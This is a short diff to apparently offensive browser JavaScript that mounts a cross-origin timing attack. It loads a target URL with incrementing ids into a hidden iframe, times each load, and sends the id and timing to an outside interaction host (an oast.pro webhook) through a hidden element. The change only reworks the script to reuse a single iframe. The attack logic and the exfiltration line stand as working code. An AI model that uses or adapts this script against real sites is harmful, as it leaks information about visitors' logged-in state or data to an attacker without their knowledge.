@@ -5,10 +5,11 @@ const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";
 let i = 0;
 const MAX = 2000;
 
-function probe(id) {
-    const iframe = document.createElement("iframe");
-    iframe.style.display = "none";
+const iframe = document.createElement("iframe");
+iframe.style.display = "none";
+document.documentElement.appendChild(iframe);
 
+function probe(id) {
     const start = performance.now();
 
     iframe.onload = () => {
@@ -20,12 +21,9 @@ function probe(id) {
         ex.src = WEBHOOK + "?id=" + id + "&t=" + delta;
         ex.style.display = "none";
         document.documentElement.appendChild(ex);
-
-        iframe.remove();
     };
 
     iframe.src = TARGET + id;
-    document.documentElement.appendChild(iframe);
 }
 
 function loop() {
